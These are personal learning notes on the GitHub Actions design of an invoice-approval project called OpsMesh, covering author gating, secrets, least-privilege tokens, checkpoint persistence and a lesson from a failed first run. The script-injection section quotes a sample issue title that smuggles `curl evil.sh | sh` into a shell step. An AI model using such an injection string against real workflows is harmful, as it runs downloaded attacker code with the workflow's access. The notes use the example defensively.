# Learning notes

Plain-English notes on the platform pieces behind OpsMesh. Each entry covers what it is, why it was used, what it costs, and one sentence you could say in an interview.

---

## Live mode on GitHub Actions

### 1. GitHub Actions workflows and events

**What:** a workflow is a YAML file in `.github/workflows/`. GitHub runs it on a fresh virtual machine (a *runner*) when an *event* happens. OpsMesh listens to two:
- `issues: opened` for a new invoice;
- `issue_comment: created` for `/approve`, `/reject` and `/retry`.

**Why:** the issue *is* the inbox, the comment thread *is* the approval conversation, and the labels *are* the status. There's no server to run and no new account.

**Cost:** free for public repos on standard runners. Each invoice takes about a minute of runner time.

**Interview line:** *"I used GitHub Actions as an event-driven serverless runtime. An issue with an invoice attached triggers the pipeline, and a comment resumes a paused approval, so there's no infrastructure to run."*

### 2. The job `if:` gate, and why public repos plus secrets need care

**What:** on a public repo anyone can open an issue, and issue-triggered workflows run with access to the repo's secrets. The `if:` condition on the job is checked *before the job starts*. Because it only lets through issues and comments from `nrjalela`, a stranger's issue never starts a job, so it can never reach the step that holds `ANTHROPIC_API_KEY`. The Python code checks the author a second time (defence in depth).

**Why:** without the gate, anyone on the internet could spend your API credit, or try to trick the workflow.

**Interview line:** *"The authorisation check sits at the job level, so untrusted events are filtered before any secret enters the environment. The code checks again as a second layer."*

### 3. Script injection: data, not code

**What:** writing `${{ github.event.issue.title }}` straight into a `run:` script pastes attacker-controlled text into a shell command. An issue titled `"; curl evil.sh | sh #` would run. OpsMesh passes issue and comment text through `env:` variables, and Python reads them as plain strings.

**Why:** it's the most common GitHub Actions vulnerability, and it's easy to avoid.

**Interview line:** *"I never interpolate event payloads into shell. They go in as environment variables, so user text is always data, never code."*

### 4. `GITHUB_TOKEN` and least privilege

**What:** each run gets a short-lived token. The workflow starts with `permissions: {}` (nothing), and the job asks only for `issues: write` (comment, label, close) and `contents: write` (push the state branch).

**Why:** if something went wrong, the blast radius is small. The token expires when the job ends.

**Cost:** free.

**Interview line:** *"Permissions default to none, and the job gets only issue-write and branch-write for its own run. That's least privilege, with a token that expires at the end of the job."*

### 5. Secrets

**What:** a repository secret is stored encrypted by GitHub and only given to jobs that reference it. It's masked in logs. You set it once: `gh secret set ANTHROPIC_API_KEY --repo nrjalela/opsmesh` (it prompts, so the key never lands in your shell history).

**Why:** no keys in code or git history. The pre-push scan checks every commit for key patterns and for the literal values from `.env`.

**Interview line:** *"The API key lives only in GitHub's encrypted secret store, scoped to the one job that needs it, and a pre-push scan checks every commit for leaks."*

### 6. Persisting a paused LangGraph run between Action runs

**What:** a held invoice waits hours or days for `/approve`, but every Action run starts on a blank machine. LangGraph's *checkpointer* saves the graph's state at the pause, and resuming reloads it.

| Option | Why not / why |
|---|---|
| Actions cache | Can be evicted (7 days unused, 10 GB cap). It's a cache, not a database |
| Artifacts | Expire (90 days max), and are awkward to read from a different run |
| External database | Needs a new account and credentials |
| **`opsmesh-state` git branch** ✓ | Durable, free, versioned, and every change is a commit |

The branch holds `checkpoints.sqlite` (LangGraph's official SQLite checkpointer), `ledger.json`, `hashes.json` and `audit.jsonl`. A test pauses a run, throws the objects away, then resumes from the file, just as two separate Action runs would.

**Cost:** free.

**Interview line:** *"Runners are ephemeral, so I persist LangGraph checkpoints in SQLite on a dedicated state branch. It's durable, free and versioned, and git history doubles as an audit trail."*

### 7. `concurrency`: one run at a time

**What:** `concurrency: group: opsmesh-live` with `cancel-in-progress: false` queues runs instead of running them side by side.

**Why:** two runs pushing to the state branch at once would conflict, and a daily cap counted by two parallel runs could be exceeded.

**Interview line:** *"A concurrency group serialises runs, which gives me single-writer semantics on the state branch without a lock server."*

### 8. Issue forms

**What:** `.github/ISSUE_TEMPLATE/submit-invoice.yml` turns "new issue" into a form. Its `upload` field (added March 2026) accepts `.pdf` only. The form auto-applies the `invoice` label, which the workflow requires.

**Why:** structured input with no custom UI, and a warning that the repo is public.

**Interview line:** *"An issue form gives a validated intake screen, with the file upload and a synthetic-data confirmation, for zero UI code."*

### 9. Controls built into the flow

- **PDF hash (SHA-256):** the exact same file is refused before any AI call, so it costs nothing.
- **Live ledger:** posted live invoices join the AP ledger, so the engine's own duplicate rules also catch a re-scanned copy.
- **Daily cap:** 5 invoices per *Australian* day, counted from the audit log.
- **Single-use decisions:** a second `/approve` finds nothing pending and is refused.
- **Honest limitation:** one person both submits and approves, so segregation of duties isn't enforced. The audit log records `same_person_as_submitter: true` on every decision.

**Interview line:** *"Cheap checks run first, so rejected inputs never cost API credit, and the audit log is honest about the one control a solo demo can't enforce."*

### 10. What the first live test taught me (a good interview story)

**What happened:** the first test issue ran about a minute before the API key secret was saved. The pipeline failed safe: it held the invoice for a person, showed the error, and spent $0. But the code still recorded that attempt as "processed". It used up a daily-cap slot and claimed the PDF hash, so `/retry` would have said "already processed", and re-submitting would have been flagged as a duplicate.

**The fix:**
- Check the key up front.
- Record a run that reads nothing as "failed": no hash claimed, no cap slot used.
- Give each retry a fresh LangGraph thread.
- Correct the bad record with an appended `voided` event rather than editing history, so the audit log stays append-only.

Three new tests cover it. The retry then ran for real ($0.033), was held for the price variance and short shipment, and `/approve` posted it and closed the issue.

**Interview line:** *"My first live run exposed that failed attempts were being counted as processed. I made failures release their duplicate-hash and quota claims, and I corrected the record by appending a void event, because you don't rewrite an audit trail."*

---

## Parked: Azure

See [azure-plan.md](azure-plan.md) for the parked Azure plan: Functions, Blob, Cosmos DB, Foundry, and the honest data-zone findings.
